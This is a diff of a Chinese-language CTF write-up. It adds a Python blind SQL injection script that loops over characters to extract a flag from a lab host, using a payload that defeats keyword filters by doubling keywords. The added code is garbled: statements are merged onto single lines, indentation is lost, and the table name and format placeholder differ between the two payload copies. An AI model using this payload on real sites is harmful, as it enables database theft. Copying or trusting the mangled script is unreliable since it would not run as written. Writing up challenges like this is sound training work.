@@ -12,9 +12,23 @@ date: 2024-04-26
    1. 目录扫描，发现网站源码
 2. web 题
    1. SQL 注入的绕过和盲注，payload：`?id=1'anandd/**/if(ascii(substr((selselectect(flflagag)from(m1w63729alq1embcbd)),(position},1)) like/**/{mid},1,0)%23"`
-3. 杂项，文件
+
+    ```python
+    import requests
+
+    url = "<http://192.168.5.144:20188/>" res=""
+    for i in range(1, 39):
+    payload = "?id=1'anandd/**/if(ascii(substr((selselectect(flflagag)from(m1w637z9alq1embcbd)),{position},1)) like/**/{mid},1,0)%23"
+    for j in range(32,127):
+    r = requests.get(url = url + payload.format(position=i, mid=j)) if "SQLab" in r.text:
+    res += chr(j)
+    break print(res)
+    ```
+
+4. 杂项，文件
    1. `hex edit`，修复头部`504b` 为`zip`，解压获得`2.png`，修改 `jpg` 高度
-4. 数表求乘积
+   
+5. 数表求乘积
 
    1. Python 脚本
 
